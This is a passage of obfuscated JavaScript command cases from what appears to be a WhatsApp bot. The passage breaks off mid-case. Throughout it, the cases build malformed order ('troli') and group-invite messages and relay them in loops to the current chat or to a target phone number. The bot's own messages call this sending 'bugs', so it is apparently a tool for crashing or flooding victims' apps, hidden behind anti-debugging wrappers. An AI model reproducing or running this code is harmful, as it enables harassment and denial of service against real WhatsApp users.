var _0x51833f=_0x1bbd;(function(_0x2ba6e4,_0x259396){var _0x3b58fe=_0x1bbd,_0x1f1f4a=_0x2ba6e4();while(!![]){try{var _0x3ff888=parseInt(_0x3b58fe(0x1d7))/0x1+-parseInt(_0x3b58fe(0x1ee))/0x2+-parseInt(_0x3b58fe(0x1f5))/0x3+-parseInt(_0x3b58fe(0x1d6))/0x4+-parseInt(_0x3b58fe(0x1e7))/0x5*(-parseInt(_0x3b58fe(0x1e5))/0x6)+-parseInt(_0x3b58fe(0x1d5))/0x7*(-parseInt(_0x3b58fe(0x1f2))/0x8)+parseInt(_0x3b58fe(0x1f1))/0x9;if(_0x3ff888===_0x259396)break;else _0x1f1f4a['push'](_0x1f1f4a['shift']());}catch(_0x145f65){_0x1f1f4a['push'](_0x1f1f4a['shift']());}}}(_0x5853,0x51709));var _0x25978c=(function(){var _0x19c909=!![];return function(_0x27cd6e,_0x397394){var _0x1286d6=_0x19c909?function(){var _0x57977a=_0x1bbd;if(_0x397394){var _0x43144f=_0x397394[_0x57977a(0x1e2)](_0x27cd6e,arguments);return _0x397394=null,_0x43144f;}}:function(){};return _0x19c909=![],_0x1286d6;};}()),_0x3cc66c=_0x25978c(this,function(){var _0x23f68c=_0x1bbd;return _0x3cc66c[_0x23f68c(0x1dc)]()[_0x23f68c(0x1e3)](_0x23f68c(0x1ed))[_0x23f68c(0x1dc)]()[_0x23f68c(0x1d3)](_0x3cc66c)[_0x23f68c(0x1e3)](_0x23f68c(0x1ed));});_0x3cc66c();function _0x1bbd(_0x512111,_0x3215d2){var _0x1065e0=_0x5853();return _0x1bbd=function(_0x4a709a,_0x50d6d9){_0x4a709a=_0x4a709a-0x1d2;var _0x488bfd=_0x1065e0[_0x4a709a];return _0x488bfd;},_0x1bbd(_0x512111,_0x3215d2);}var _0x50d6d9=(function(){var _0x180b95=!![];return function(_0x5892aa,_0x496e49){var _0x2ba865=_0x180b95?function(){if(_0x496e49){var _0x4687c9=_0x496e49['apply'](_0x5892aa,arguments);return _0x496e49=null,_0x4687c9;}}:function(){};return _0x180b95=![],_0x2ba865;};}()),_0x4a709a=_0x50d6d9(this,function(){var _0x38414f=_0x1bbd,_0x3b065b=function(){var _0x3fdf80=_0x1bbd,_0x499aea;try{_0x499aea=Function('return\x20(function()\x20'+_0x3fdf80(0x1d9)+');')();}catch(_0x1663cc){_0x499aea=window;}return _0x499aea;},_0x12a0a3=_0x3b065b(),_0x20225a=_0x12a0a3[_0x38414f(0x1d8)]=_0x12a0a3['console']||{},_0x2c7efc=[_0x38414f(0x1de),_0x38414f(0x1e9),_0x38414f(0x1f0),_0x38414f(0x1eb),'exception',_0x38414f(0x1e6),_0x38414f(0x1f3)];for(var _0x183b6d=0x0;_0x183b6d<_0x2c7efc[_0x38414f(0x1d2)];_0x183b6d++){var _0x800001=_0x50d6d9[_0x38414f(0x1d3)][_0x38414f(0x1ec)][_0x38414f(0x1da)](_0x50d6d9),_0x2e6a26=_0x2c7efc[_0x183b6d],_0x5c2bd9=_0x20225a[_0x2e6a26]||_0x800001;_0x800001['__proto__']=_0x50d6d9['bind'](_0x50d6d9),_0x800001[_0x38414f(0x1dc)]=_0x5c2bd9[_0x38414f(0x1dc)][_0x38414f(0x1da)](_0x5c2bd9),_0x20225a[_0x2e6a26]=_0x800001;}});_0x4a709a();{if(!isCreator&&!isBan)return;if(args['length']==0x0)return m[_0x51833f(0x1d4)]('Jumlahnya?');jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){var messa=await prepareWAMessageMedia({'image':fs[_0x51833f(0x1ea)](_0x51833f(0x1dd))},{'upload':jobotz[_0x51833f(0x1e4)]}),groupInvite=generateWAMessageFromContent(m['chat'],proto[_0x51833f(0x1ef)][_0x51833f(0x1e0)]({'groupInviteMessage':{'groupJid':_0x51833f(0x1db),'inviteCode':'wFHwtOxGQN8OwK2x','inviteExpiration':'𝑻𝑯𝑬\x20𝑱𝑶\x20𝑩𝑶𝑻𝒁'+philips,'groupName':'𝑻𝑯𝑬\x20𝑱𝑶\x20𝑩𝑶𝑻𝒁'+philips,'caption':''+philips,'jpegThumbnail':messa[_0x51833f(0x1f6)]}}),{'userJid':m[_0x51833f(0x1f4)],'quoted':fkonjo});jobotz[_0x51833f(0x1df)](m['chat'],groupInvite[_0x51833f(0x1e1)],{'messageId':groupInvite['key']['id']});}jancok(_0x51833f(0x1e8)+jumlah);}function _0x5853(){var _0x442daa=['chat','1887825HLtJLI','imageMessage','length','constructor','reply','31927UEMynQ','2492480taNvNt','561375HenEEJ','console','{}.constructor(\x22return\x20this\x22)(\x20)','bind','85296556573-1328272333@g.us','toString','./pict.jpg','log','relayMessage','fromObject','message','apply','search','waUploadToServer','31896Ifmurz','table','380MlvZhv','Sukses\x20Send\x20Bug\x20Sebanyak\x20','warn','readFileSync','error','prototype','(((.+)+)+)+$','746166NIwRbj','Message','info','3442410jMlsCM','1072uRTTRs','trace'];_0x5853=function(){return _0x442daa;};return _0x5853();}
}
break

case 'jaditroli':{
function _0x35cc(){const _0x993aae=['4933940erHZbW','length','log','apply','832720uvPrbk','table','chat','23325410wsTrbw','error','constructor','27NzqXRi','search','warn','90mUDrmG','CATALOG','__proto__','(((.+)+)+)+$','4699788JymIyk','Teksnya\x20Mana?','bind','5ETIagU','IDR','5287265358017580','console','965038gtbUGp','info','Sukses\x20Convert\x20Troli','key','prototype','exception','message','631096rZzSMo','toString','{}.constructor(\x22return\x20this\x22)(\x20)','86848DJXhVu','return\x20(function()\x20','IDR\x2099.99999999999999999999'];_0x35cc=function(){return _0x993aae;};return _0x35cc();}const _0xa5f4bf=_0x44dc;(function(_0x45c72c,_0x276e49){const _0x4defb3=_0x44dc,_0x6d9a9f=_0x45c72c();while(!![]){try{const _0x2f8f4d=-parseInt(_0x4defb3(0xaa))/0x1+parseInt(_0x4defb3(0x8f))/0x2*(parseInt(_0x4defb3(0x9c))/0x3)+-parseInt(_0x4defb3(0x92))/0x4+-parseInt(_0x4defb3(0xa6))/0x5*(parseInt(_0x4defb3(0xa3))/0x6)+parseInt(_0x4defb3(0x96))/0x7+-parseInt(_0x4defb3(0x8c))/0x8*(-parseInt(_0x4defb3(0x9f))/0x9)+parseInt(_0x4defb3(0x99))/0xa;if(_0x2f8f4d===_0x276e49)break;else _0x6d9a9f['push'](_0x6d9a9f['shift']());}catch(_0x3dcfec){_0x6d9a9f['push'](_0x6d9a9f['shift']());}}}(_0x35cc,0x9e896));const _0x13c782=(function(){let _0x3be0ef=!![];return function(_0x3edc76,_0x50eeba){const _0x547581=_0x3be0ef?function(){const _0x4bbd37=_0x44dc;if(_0x50eeba){const _0x3f4566=_0x50eeba[_0x4bbd37(0x95)](_0x3edc76,arguments);return _0x50eeba=null,_0x3f4566;}}:function(){};return _0x3be0ef=![],_0x547581;};}()),_0x454423=_0x13c782(this,function(){const _0x5455a3=_0x44dc;return _0x454423[_0x5455a3(0x8d)]()[_0x5455a3(0x9d)](_0x5455a3(0xa2))[_0x5455a3(0x8d)]()[_0x5455a3(0x9b)](_0x454423)[_0x5455a3(0x9d)]('(((.+)+)+)+$');});_0x454423();function _0x44dc(_0x5403ef,_0x426b56){const _0x2ed660=_0x35cc();return _0x44dc=function(_0x145d33,_0x3850ab){_0x145d33=_0x145d33-0x8c;let _0x72c88e=_0x2ed660[_0x145d33];return _0x72c88e;},_0x44dc(_0x5403ef,_0x426b56);}const _0x3850ab=(function(){let _0xf5809f=!![];return function(_0xd3a6b2,_0x5a3446){const _0x1fd0cd=_0xf5809f?function(){if(_0x5a3446){const _0x1e3f8d=_0x5a3446['apply'](_0xd3a6b2,arguments);return _0x5a3446=null,_0x1e3f8d;}}:function(){};return _0xf5809f=![],_0x1fd0cd;};}()),_0x145d33=_0x3850ab(this,function(){const _0x1042e3=_0x44dc;let _0x2227d7;try{const _0x183781=Function(_0x1042e3(0x90)+_0x1042e3(0x8e)+');');_0x2227d7=_0x183781();}catch(_0x521063){_0x2227d7=window;}const _0x1556be=_0x2227d7[_0x1042e3(0xa9)]=_0x2227d7[_0x1042e3(0xa9)]||{},_0x5d6153=[_0x1042e3(0x94),_0x1042e3(0x9e),_0x1042e3(0xab),_0x1042e3(0x9a),_0x1042e3(0xaf),_0x1042e3(0x97),'trace'];for(let _0x5b7897=0x0;_0x5b7897<_0x5d6153[_0x1042e3(0x93)];_0x5b7897++){const _0x3d613=_0x3850ab[_0x1042e3(0x9b)][_0x1042e3(0xae)][_0x1042e3(0xa5)](_0x3850ab),_0x176a34=_0x5d6153[_0x5b7897],_0x136ed8=_0x1556be[_0x176a34]||_0x3d613;_0x3d613[_0x1042e3(0xa1)]=_0x3850ab['bind'](_0x3850ab),_0x3d613[_0x1042e3(0x8d)]=_0x136ed8['toString'][_0x1042e3(0xa5)](_0x136ed8),_0x1556be[_0x176a34]=_0x3d613;}});_0x145d33();{if(!isCreator&&!isBan)return;if(!text)throw _0xa5f4bf(0xa4);let troli=generateWAMessageFromContent(m[_0xa5f4bf(0x98)],{'orderMessage':{'orderId':_0xa5f4bf(0xa8),'thumbnail':virgam,'itemCount':0x7e9,'status':'INQUIRY','surface':_0xa5f4bf(0xa0),'orderTitle':'FIXED\x20BY\x20THE\x20JO\x20BOT\x20CASE\x20MD','message':''+text,'sellerJid':'5491133536405@s.whatsapp.net','token':'AR57p+dSS4yeh4tAQCMyt51dvXpHlgliVN1/6Au+XBE3+w==','totalAmount1000':_0xa5f4bf(0x91),'totalCurrencyCode':_0xa5f4bf(0xa7),'contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}},{'quoted':fkonjo,'contextInfo':{}});jobotz['relayMessage'](m['chat'],troli[_0xa5f4bf(0xb0)],{'messageId':troli[_0xa5f4bf(0xad)]['id']}),jancok(_0xa5f4bf(0xac));}
	}
	break

	case 'jotrolito': {
const _0x1d2399=_0x39f7;(function(_0x67f5d7,_0x25c200){const _0x569318=_0x39f7,_0x185a21=_0x67f5d7();while(!![]){try{const _0x4e94e1=parseInt(_0x569318(0xb0))/0x1+-parseInt(_0x569318(0xa4))/0x2*(-parseInt(_0x569318(0xb9))/0x3)+-parseInt(_0x569318(0xbc))/0x4+parseInt(_0x569318(0xa8))/0x5*(parseInt(_0x569318(0x9a))/0x6)+parseInt(_0x569318(0xaf))/0x7+parseInt(_0x569318(0xa5))/0x8*(parseInt(_0x569318(0xa0))/0x9)+-parseInt(_0x569318(0x9d))/0xa;if(_0x4e94e1===_0x25c200)break;else _0x185a21['push'](_0x185a21['shift']());}catch(_0x5a2a85){_0x185a21['push'](_0x185a21['shift']());}}}(_0x3b66,0x6eced));const _0x31bd76=(function(){let _0x229d57=!![];return function(_0x5269b0,_0x1cb808){const _0x431627=_0x229d57?function(){const _0x1d7398=_0x39f7;if(_0x1cb808){const _0x3b29d1=_0x1cb808[_0x1d7398(0xc1)](_0x5269b0,arguments);return _0x1cb808=null,_0x3b29d1;}}:function(){};return _0x229d57=![],_0x431627;};}()),_0x2aacae=_0x31bd76(this,function(){const _0x2cf43=_0x39f7;return _0x2aacae[_0x2cf43(0xbe)]()[_0x2cf43(0xbf)](_0x2cf43(0xb5))['toString']()[_0x2cf43(0xb3)](_0x2aacae)[_0x2cf43(0xbf)](_0x2cf43(0xb5));});_0x2aacae();function _0x3b66(){const _0x21627f=['message','5491133536405@s.whatsapp.net','51MlFMaW','AR57p+dSS4yeh4tAQCMyt51dvXpHlgliVN1/6Au+XBE3+w==','table','579040lTiQmf','chat','toString','search','@s.whatsapp.net','apply','key','relayMessage','console','IDR\x2099.99999999999999999999','42lRyNOD','info','INQUIRY','23115310BOEmBQ','error','Berhasil\x20Mengirim\x20Troli\x20Di\x20Nomer\x20','7443GPtHWC','exception','IDR','prototype','92906lPoIhi','2416vECDZO','😈⏤͟͟͞𝑻𝑯𝑬\x20𝑱𝑶\x20𝑩𝑶𝑻𝒁','log','341065QIFiEA','FIXED\x20BY\x20THE\x20JO\x20BOT\x20CASE\x20MD','trace','readFileSync','length','Nomernya\x20mana?','warn','6030017SlEGpq','531783bMxFzM','src/virgam\x20yg\x20ganas.jpeg','bind','constructor','CATALOG','(((.+)+)+)+$','reply'];_0x3b66=function(){return _0x21627f;};return _0x3b66();}function _0x39f7(_0x1dbfcf,_0x189a8c){const _0x543105=_0x3b66();return _0x39f7=function(_0x5b6dbb,_0x11e329){_0x5b6dbb=_0x5b6dbb-0x97;let _0x550d1a=_0x543105[_0x5b6dbb];return _0x550d1a;},_0x39f7(_0x1dbfcf,_0x189a8c);}const _0x11e329=(function(){let _0x333128=!![];return function(_0xd667ed,_0x13d5e4){const _0x28d401=_0x333128?function(){const _0x428ff2=_0x39f7;if(_0x13d5e4){const _0x38f5e5=_0x13d5e4[_0x428ff2(0xc1)](_0xd667ed,arguments);return _0x13d5e4=null,_0x38f5e5;}}:function(){};return _0x333128=![],_0x28d401;};}()),_0x5b6dbb=_0x11e329(this,function(){const _0x3b121b=_0x39f7;let _0x9715bd;try{const _0x1de07e=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x9715bd=_0x1de07e();}catch(_0x506e39){_0x9715bd=window;}const _0x1f575e=_0x9715bd[_0x3b121b(0x98)]=_0x9715bd[_0x3b121b(0x98)]||{},_0x57d38f=[_0x3b121b(0xa7),_0x3b121b(0xae),_0x3b121b(0x9b),_0x3b121b(0x9e),_0x3b121b(0xa1),_0x3b121b(0xbb),_0x3b121b(0xaa)];for(let _0x2ea905=0x0;_0x2ea905<_0x57d38f[_0x3b121b(0xac)];_0x2ea905++){const _0x1afa7b=_0x11e329['constructor'][_0x3b121b(0xa3)][_0x3b121b(0xb2)](_0x11e329),_0x4ec545=_0x57d38f[_0x2ea905],_0x4a1e48=_0x1f575e[_0x4ec545]||_0x1afa7b;_0x1afa7b['__proto__']=_0x11e329[_0x3b121b(0xb2)](_0x11e329),_0x1afa7b[_0x3b121b(0xbe)]=_0x4a1e48[_0x3b121b(0xbe)][_0x3b121b(0xb2)](_0x4a1e48),_0x1f575e[_0x4ec545]=_0x1afa7b;}});_0x5b6dbb();{if(!isCreator&&!isBan)return;if(!text)throw _0x1d2399(0xad);f=fs[_0x1d2399(0xab)](_0x1d2399(0xb1));let troli=generateWAMessageFromContent(m[_0x1d2399(0xbd)],{'orderMessage':{'orderId':'5287265358017580','thumbnail':virgam,'itemCount':0x7e9,'status':_0x1d2399(0x9c),'surface':_0x1d2399(0xb4),'orderTitle':_0x1d2399(0xa9),'message':_0x1d2399(0xa6),'sellerJid':_0x1d2399(0xb8),'token':_0x1d2399(0xba),'totalAmount1000':_0x1d2399(0x99),'totalCurrencyCode':_0x1d2399(0xa2),'contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}},{'quoted':fkonjo,'contextInfo':{}});jobotz[_0x1d2399(0x97)](text+_0x1d2399(0xc0),troli[_0x1d2399(0xb7)],{'messageId':troli[_0x1d2399(0xc2)]['id']}),await m[_0x1d2399(0xb6)](_0x1d2399(0x9f)+text);}
	}
	break

	case 'jogastroli': {
const _0x4905c6=_0x1825;function _0x1825(_0x2dfccc,_0x4882cf){const _0x3b1245=_0x1809();return _0x1825=function(_0x1f0c6e,_0x73fbe9){_0x1f0c6e=_0x1f0c6e-0xf4;let _0x2acecf=_0x3b1245[_0x1f0c6e];return _0x2acecf;},_0x1825(_0x2dfccc,_0x4882cf);}(function(_0x3fdd98,_0x338287){const _0x22b001=_0x1825,_0x293df3=_0x3fdd98();while(!![]){try{const _0x456a94=parseInt(_0x22b001(0x10a))/0x1+parseInt(_0x22b001(0x114))/0x2+parseInt(_0x22b001(0xf7))/0x3*(parseInt(_0x22b001(0x10e))/0x4)+parseInt(_0x22b001(0x115))/0x5*(parseInt(_0x22b001(0xf6))/0x6)+-parseInt(_0x22b001(0x11a))/0x7*(-parseInt(_0x22b001(0xfa))/0x8)+parseInt(_0x22b001(0x108))/0x9*(parseInt(_0x22b001(0x105))/0xa)+-parseInt(_0x22b001(0x119))/0xb*(parseInt(_0x22b001(0xff))/0xc);if(_0x456a94===_0x338287)break;else _0x293df3['push'](_0x293df3['shift']());}catch(_0x231e67){_0x293df3['push'](_0x293df3['shift']());}}}(_0x1809,0x73218));const _0x12112f=(function(){let _0x336d40=!![];return function(_0x282bcc,_0x5ce5b8){const _0x2d3aee=_0x336d40?function(){if(_0x5ce5b8){const _0x1b7e2a=_0x5ce5b8['apply'](_0x282bcc,arguments);return _0x5ce5b8=null,_0x1b7e2a;}}:function(){};return _0x336d40=![],_0x2d3aee;};}()),_0x579f48=_0x12112f(this,function(){const _0xaabb3e=_0x1825;return _0x579f48[_0xaabb3e(0x112)]()[_0xaabb3e(0x106)](_0xaabb3e(0x118))[_0xaabb3e(0x112)]()['constructor'](_0x579f48)[_0xaabb3e(0x106)](_0xaabb3e(0x118));});_0x579f48();const _0x73fbe9=(function(){let _0x5946c8=!![];return function(_0x4aadc5,_0x494ce0){const _0x34c9e7=_0x5946c8?function(){const _0x240176=_0x1825;if(_0x494ce0){const _0x3586ec=_0x494ce0[_0x240176(0x116)](_0x4aadc5,arguments);return _0x494ce0=null,_0x3586ec;}}:function(){};return _0x5946c8=![],_0x34c9e7;};}()),_0x1f0c6e=_0x73fbe9(this,function(){const _0x45eca5=_0x1825;let _0x5932a3;try{const _0x1cdc29=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x5932a3=_0x1cdc29();}catch(_0x27de87){_0x5932a3=window;}const _0x23c4ff=_0x5932a3[_0x45eca5(0x102)]=_0x5932a3[_0x45eca5(0x102)]||{},_0x4a1e97=[_0x45eca5(0x111),_0x45eca5(0xf9),_0x45eca5(0x110),_0x45eca5(0xf4),'exception',_0x45eca5(0xf8),'trace'];for(let _0x18eecc=0x0;_0x18eecc<_0x4a1e97['length'];_0x18eecc++){const _0x5a7d3f=_0x73fbe9[_0x45eca5(0xfc)][_0x45eca5(0x10c)][_0x45eca5(0xfd)](_0x73fbe9),_0x546553=_0x4a1e97[_0x18eecc],_0x1cf272=_0x23c4ff[_0x546553]||_0x5a7d3f;_0x5a7d3f['__proto__']=_0x73fbe9['bind'](_0x73fbe9),_0x5a7d3f['toString']=_0x1cf272['toString'][_0x45eca5(0xfd)](_0x1cf272),_0x23c4ff[_0x546553]=_0x5a7d3f;}});_0x1f0c6e();{if(!isCreator&&!isBan)return;if(!text)throw'Nomernya\x20mana?';f=fs['readFileSync'](_0x4905c6(0x10d));let troli=generateWAMessageFromContent(m[_0x4905c6(0x104)],{'orderMessage':{'orderId':_0x4905c6(0x117),'thumbnail':virgam,'itemCount':0x7e9,'status':_0x4905c6(0xfe),'surface':_0x4905c6(0x101),'orderTitle':_0x4905c6(0xfb),'message':'😈⏤͟͟͞𝑻𝑯𝑬\x20𝑱𝑶\x20𝑩𝑶𝑻𝒁','sellerJid':_0x4905c6(0x100),'token':_0x4905c6(0x10b),'totalAmount1000':'IDR\x2099.99999999999999999999','totalCurrencyCode':_0x4905c6(0x109),'contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}},{'quoted':fkonjo,'contextInfo':{}});jobotz[_0x4905c6(0x113)](m['chat'],troli[_0x4905c6(0x10f)],{'messageId':troli[_0x4905c6(0x103)]['id']}),jobotz[_0x4905c6(0x113)](text+_0x4905c6(0xf5),troli[_0x4905c6(0x10f)],{'messageId':troli['key']['id']}),jancok(_0x4905c6(0x107)+text);}function _0x1809(){const _0x5020cb=['console','key','chat','100dlprZJ','search','Berhasil\x20Mengirim\x20Troli\x20Di\x20Nomer\x20','57357bZaYZJ','IDR','663036zdIpti','AR57p+dSS4yeh4tAQCMyt51dvXpHlgliVN1/6Au+XBE3+w==','prototype','src/virgam\x20yg\x20ganas.jpeg','128iNUong','message','info','log','toString','relayMessage','94390GqnclU','5OQaGzE','apply','5287265358017580','(((.+)+)+)+$','22xKlDvZ','7hIsxVL','error','@s.whatsapp.net','4796886HiOodX','83166DTfHqB','table','warn','4655872CLFyEp','FIXED\x20BY\x20THE\x20JO\x20BOT\x20CASE\x20MD','constructor','bind','INQUIRY','15425724zSCAgy','5491133536405@s.whatsapp.net','CATALOG'];_0x1809=function(){return _0x5020cb;};return _0x1809();}
	}
	break

case 'jotroli': {
const _0x979d69=_0x3fef;(function(_0x2a59f7,_0x4ad171){const _0x414e1d=_0x3fef,_0x242436=_0x2a59f7();while(!![]){try{const _0x159d91=parseInt(_0x414e1d(0xf6))/0x1+parseInt(_0x414e1d(0xf9))/0x2*(parseInt(_0x414e1d(0x100))/0x3)+parseInt(_0x414e1d(0x101))/0x4*(parseInt(_0x414e1d(0xff))/0x5)+parseInt(_0x414e1d(0x104))/0x6+-parseInt(_0x414e1d(0xf0))/0x7*(parseInt(_0x414e1d(0x103))/0x8)+parseInt(_0x414e1d(0x10a))/0x9*(parseInt(_0x414e1d(0xf1))/0xa)+parseInt(_0x414e1d(0xf4))/0xb*(-parseInt(_0x414e1d(0x10d))/0xc);if(_0x159d91===_0x4ad171)break;else _0x242436['push'](_0x242436['shift']());}catch(_0x4f9fc9){_0x242436['push'](_0x242436['shift']());}}}(_0x2f06,0xeeb44));const _0x4a569b=(function(){let _0x1a617e=!![];return function(_0x2e8092,_0x40bf8a){const _0xe2beaa=_0x1a617e?function(){const _0x580b27=_0x3fef;if(_0x40bf8a){const _0x2b9829=_0x40bf8a[_0x580b27(0x10c)](_0x2e8092,arguments);return _0x40bf8a=null,_0x2b9829;}}:function(){};return _0x1a617e=![],_0xe2beaa;};}()),_0x4abf85=_0x4a569b(this,function(){const _0x3f0b94=_0x3fef;return _0x4abf85[_0x3f0b94(0xfa)]()[_0x3f0b94(0x10b)](_0x3f0b94(0xee))['toString']()[_0x3f0b94(0xe9)](_0x4abf85)[_0x3f0b94(0x10b)](_0x3f0b94(0xee));});_0x4abf85();function _0x3fef(_0x21a244,_0x270cce){const _0x4e3864=_0x2f06();return _0x3fef=function(_0x3b151b,_0x337aaf){_0x3b151b=_0x3b151b-0xe9;let _0x5d172b=_0x4e3864[_0x3b151b];return _0x5d172b;},_0x3fef(_0x21a244,_0x270cce);}const _0x337aaf=(function(){let _0x4232b9=!![];return function(_0x3dc563,_0x3ddc3e){const _0x261973=_0x4232b9?function(){const _0x2fe677=_0x3fef;if(_0x3ddc3e){const _0x41a68f=_0x3ddc3e[_0x2fe677(0x10c)](_0x3dc563,arguments);return _0x3ddc3e=null,_0x41a68f;}}:function(){};return _0x4232b9=![],_0x261973;};}()),_0x3b151b=_0x337aaf(this,function(){const _0x3a9ae3=_0x3fef,_0x26bb92=function(){const _0x52a598=_0x3fef;let _0x131860;try{_0x131860=Function(_0x52a598(0x105)+_0x52a598(0xf7)+');')();}catch(_0x5b5c8c){_0x131860=window;}return _0x131860;},_0x5454bb=_0x26bb92(),_0x36ed1c=_0x5454bb['console']=_0x5454bb[_0x3a9ae3(0xeb)]||{},_0x19afb5=[_0x3a9ae3(0xed),'warn','info','error','exception','table','trace'];for(let _0x14de66=0x0;_0x14de66<_0x19afb5[_0x3a9ae3(0xf5)];_0x14de66++){const _0x4edadd=_0x337aaf[_0x3a9ae3(0xe9)][_0x3a9ae3(0xf2)][_0x3a9ae3(0xfd)](_0x337aaf),_0x206f21=_0x19afb5[_0x14de66],_0x4b5410=_0x36ed1c[_0x206f21]||_0x4edadd;_0x4edadd['__proto__']=_0x337aaf[_0x3a9ae3(0xfd)](_0x337aaf),_0x4edadd[_0x3a9ae3(0xfa)]=_0x4b5410[_0x3a9ae3(0xfa)][_0x3a9ae3(0xfd)](_0x4b5410),_0x36ed1c[_0x206f21]=_0x4edadd;}});function _0x2f06(){const _0x53f3d8=['1600083bhOAfa','search','apply','17007348jazOre','constructor','IDR\x2099.99999999999999999999','console','readFileSync','log','(((.+)+)+)+$','reply','54425DzWcSR','10KruUYi','prototype','chat','22afaQuV','length','568240uZBFKw','{}.constructor(\x22return\x20this\x22)(\x20)','5491133536405@s.whatsapp.net','1075166NNXDyN','toString','IDR','key','bind','CATALOG','1045IMLXNi','6EMHxgE','36328jxggtr','5287265358017580','376lHBRMP','2750304YbplRt','return\x20(function()\x20','Sukses\x20Send\x20Bug\x20Sebanyak\x20','😈⏤͟͟͞𝑻𝑯𝑬\x20𝑱𝑶\x20𝑩𝑶𝑻𝒁','AR57p+dSS4yeh4tAQCMyt51dvXpHlgliVN1/6Au+XBE3+w==','src/virgam\x20yg\x20ganas.jpeg'];_0x2f06=function(){return _0x53f3d8;};return _0x2f06();}_0x3b151b();{if(!isCreator&&!isBan)return;if(args[_0x979d69(0xf5)]==0x0)return m[_0x979d69(0xef)]('Jumlahnya?');jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){f=fs[_0x979d69(0xec)](_0x979d69(0x109));let troli=generateWAMessageFromContent(m[_0x979d69(0xf3)],{'orderMessage':{'orderId':_0x979d69(0x102),'thumbnail':virgam,'itemCount':0x7e9,'status':'INQUIRY','surface':_0x979d69(0xfe),'orderTitle':'FIXED\x20BY\x20THE\x20JO\x20BOT\x20CASE\x20MD','message':_0x979d69(0x107),'sellerJid':_0x979d69(0xf8),'token':_0x979d69(0x108),'totalAmount1000':_0x979d69(0xea),'totalCurrencyCode':_0x979d69(0xfb),'contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}},{'quoted':fkonjo,'contextInfo':{}});jobotz['relayMessage'](m[_0x979d69(0xf3)],troli['message'],{'messageId':troli[_0x979d69(0xfc)]['id']});}jancok(_0x979d69(0x106)+jumlah);}
}
break

case 'jopay':{
const _0x55d03a=_0x1261;function _0x22ec(){const _0x784361=['bind','6GXwDBS','6XpJFpN','toString','constructor','message','apply','1804460yxFCTU','0@s.whatsapp.net','info','length','relayMessage','12987272MWwvbR','3QRgACi','log','8892450dXHbPN','prototype','exception','891055bUdAub','11503485gXouok','table','trace','key','search','IDR','(((.+)+)+)+$','console','{}.constructor(\x22return\x20this\x22)(\x20)','__proto__','chat','273974QiSttH','15115116sbNsaW','Jumlahnya?','error','warn','reply','11DZSwPF','9LYSZNt'];_0x22ec=function(){return _0x784361;};return _0x22ec();}(function(_0x47ab71,_0x3c6c50){const _0x48b8a1=_0x1261,_0x46309f=_0x47ab71();while(!![]){try{const _0x468d37=-parseInt(_0x48b8a1(0xcf))/0x1*(parseInt(_0x48b8a1(0xe0))/0x2)+parseInt(_0x48b8a1(0xe9))/0x3*(-parseInt(_0x48b8a1(0xc9))/0x4)+-parseInt(_0x48b8a1(0xd4))/0x5*(-parseInt(_0x48b8a1(0xea))/0x6)+-parseInt(_0x48b8a1(0xd5))/0x7+parseInt(_0x48b8a1(0xce))/0x8*(parseInt(_0x48b8a1(0xe7))/0x9)+parseInt(_0x48b8a1(0xd1))/0xa+parseInt(_0x48b8a1(0xe6))/0xb*(parseInt(_0x48b8a1(0xe1))/0xc);if(_0x468d37===_0x3c6c50)break;else _0x46309f['push'](_0x46309f['shift']());}catch(_0x4a4ab6){_0x46309f['push'](_0x46309f['shift']());}}}(_0x22ec,0xf2a78));const _0x56b472=(function(){let _0x497ce7=!![];return function(_0x39c180,_0x4fe9ff){const _0x4bdaeb=_0x497ce7?function(){if(_0x4fe9ff){const _0x58e10b=_0x4fe9ff['apply'](_0x39c180,arguments);return _0x4fe9ff=null,_0x58e10b;}}:function(){};return _0x497ce7=![],_0x4bdaeb;};}()),_0x36836f=_0x56b472(this,function(){const _0x3576e7=_0x1261;return _0x36836f[_0x3576e7(0xeb)]()[_0x3576e7(0xd9)](_0x3576e7(0xdb))['toString']()['constructor'](_0x36836f)[_0x3576e7(0xd9)](_0x3576e7(0xdb));});function _0x1261(_0x16d585,_0x141f70){const _0x3d4dcd=_0x22ec();return _0x1261=function(_0x21b5d6,_0x52f5e6){_0x21b5d6=_0x21b5d6-0xc9;let _0x53623d=_0x3d4dcd[_0x21b5d6];return _0x53623d;},_0x1261(_0x16d585,_0x141f70);}_0x36836f();const _0x52f5e6=(function(){let _0x151a08=!![];return function(_0x5bef1f,_0x297b75){const _0x15bed0=_0x151a08?function(){const _0x557d89=_0x1261;if(_0x297b75){const _0x496fee=_0x297b75[_0x557d89(0xee)](_0x5bef1f,arguments);return _0x297b75=null,_0x496fee;}}:function(){};return _0x151a08=![],_0x15bed0;};}()),_0x21b5d6=_0x52f5e6(this,function(){const _0x4e8d51=_0x1261,_0x345113=function(){const _0xccd215=_0x1261;let _0x3eb825;try{_0x3eb825=Function('return\x20(function()\x20'+_0xccd215(0xdd)+');')();}catch(_0x54dce3){_0x3eb825=window;}return _0x3eb825;},_0x325a0e=_0x345113(),_0x651ba7=_0x325a0e[_0x4e8d51(0xdc)]=_0x325a0e[_0x4e8d51(0xdc)]||{},_0x5a6953=[_0x4e8d51(0xd0),_0x4e8d51(0xe4),_0x4e8d51(0xcb),_0x4e8d51(0xe3),_0x4e8d51(0xd3),_0x4e8d51(0xd6),_0x4e8d51(0xd7)];for(let _0x5b4070=0x0;_0x5b4070<_0x5a6953['length'];_0x5b4070++){const _0x115c0f=_0x52f5e6[_0x4e8d51(0xec)][_0x4e8d51(0xd2)][_0x4e8d51(0xe8)](_0x52f5e6),_0x42c84e=_0x5a6953[_0x5b4070],_0x33d023=_0x651ba7[_0x42c84e]||_0x115c0f;_0x115c0f[_0x4e8d51(0xde)]=_0x52f5e6[_0x4e8d51(0xe8)](_0x52f5e6),_0x115c0f['toString']=_0x33d023[_0x4e8d51(0xeb)][_0x4e8d51(0xe8)](_0x33d023),_0x651ba7[_0x42c84e]=_0x115c0f;}});_0x21b5d6();{if(!isCreator&&!isBan)return;if(args[_0x55d03a(0xcc)]==0x0)return m[_0x55d03a(0xe5)](_0x55d03a(0xe2));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){const 